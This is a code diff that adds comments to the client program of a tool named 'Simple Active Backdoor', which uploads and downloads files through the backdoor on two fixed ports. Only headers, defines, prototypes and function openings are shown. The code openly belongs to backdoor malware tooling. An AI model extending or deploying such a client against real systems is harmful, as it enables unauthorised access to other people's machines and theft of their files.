@@ -1,18 +1,33 @@
+/********************************************************************
+ * main.c - SAB_transfer, this is a client program for use with SAB *
+ *          (Simple Active Backdoor). This program allows you to    *
+ *          upload and download using S.A.B.                        *
+ ********************************************************************
+ * Created by Philip "5n4k3" Simonson              (2017)           *
+ ********************************************************************
+ */
+
+/* standard headers */
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <errno.h>
 
+/* my headers */
 #include "../../../debug.h"
 #include "../socket.h"
 #include "../transfer.h"
 
+/* port defines */
 #define UPLOAD_PORT 30587
 #define DOWNLOAD_PORT 30588
 
+/* function prototypes */
 int handle_download(int *sockfd, struct sockaddr_in *client, const char *filename);
 int handle_upload(int *sockfd, struct sockaddr_in *client, const char *filename);
 
+/* main() - entry point for SAB_transfer.
+ */
 int main(int argc, char *argv[]) {
   sockcreate_func_t sock_func;
   struct sockaddr_in client;
@@ -54,6 +69,8 @@ int main(int argc, char *argv[]) {
   return retval;
 }
 
+/* handle_download() - as the name suggests handles downloading.
+ */
 int handle_download(int *sockfd, struct sockaddr_in *client, const char *filename) {
   FILE *file = NULL;
   char data[BUFSIZ];
@@ -83,6 +100,8 @@ int handle_download(int *sockfd, struct sockaddr_in *client, const char *filenam
   return 1;
 }
 
+/* handle_upload() - as the name suggests handles uploading.
+ */
 int handle_upload(int *sockfd, struct sockaddr_in *client, const char *filename) {
   FILE *file = NULL;
   char data[BUFSIZ];
